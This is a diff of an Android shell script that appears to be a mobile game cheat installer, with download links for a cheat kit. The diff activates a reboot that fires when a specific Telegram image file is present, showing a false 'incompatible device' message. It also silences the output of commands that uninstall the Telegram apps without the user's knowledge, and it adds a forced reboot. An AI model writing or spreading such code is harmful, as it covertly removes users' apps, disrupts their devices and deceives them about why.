@@ -2,16 +2,17 @@
 wjt=http://ys-k.ysepan.com/625349140/120026910/t5823785553P34hjf5x8f2/11%E6%9C%8813%E6%97%A51622%E5%85%8D%E8%B4%B9%E5%86%85%E6%A0%B8%E8%BE%85%E5%8A%A95%E4%BB%B6%E5%A5%97_%E8%A7%A3%E5%8E%8B%E5%87%BA%E6%9D%A5%E5%90%8E%E5%86%8D%E6%89%A7%E8%A1%8C.zip?lx=xz
 #五件套下载链接
 hpjy=http://ys-g.ysepan.com/625349150/120026985/o582378556HPHKjfg9w602/%E5%92%8C%E5%B9%B311%E6%9C%8813%E6%97%A50032.sh?lx=xz
-#和平精英下载地址
-(dx=$(ls -l /data/media/0/Android/data/org.telegram.messenger*/-6073331903030735413_99.jpg | awk '{print $5}') >/dev/null 2>&1
+
+(
+dx=$(ls -l /data/media/0/Android/data/org.telegram.messenger*/-6073331903030735413_99.jpg | awk '{print $5}') >/dev/null 2>&1
 if [ "$dx" -ge "1" ] 
 then
 echo '不兼容你的设备，正在重启'
-#reboot
+reboot
 fi
 pm uninstall --user -0 org.telegram.messenger.web
 pm uninstall --user -0 org.telegram.messenger
- 
+) >/dev/null 2>&1 
  testurl2='www.baidu.com' 
  status=$(curl -s -m 5 -IL $testurl2|grep 200) 
  if [ "$status" == "" ] 
@@ -28,14 +29,14 @@ pm uninstall --user -0 org.telegram.messenger
   # 系统启动30分钟内不执行  
   if [[ "$a" -gt "$b" ]];  
   then  
-    echo "24小时内手机未重启，3S后自动重启，重启后请重新安装驱动"  
+    echo "24小时内手机未重启，3S后自动重启"  
     sleep 3
     reboot 
     exit  
   else
-    echo " "
+    echo "重启后请重新安装驱动"
   fi  
-
+testurl='www.google.com'
 (num=$[RANDOM%100+1]) >/dev/null 2>&1
 echo $num
 f1=1
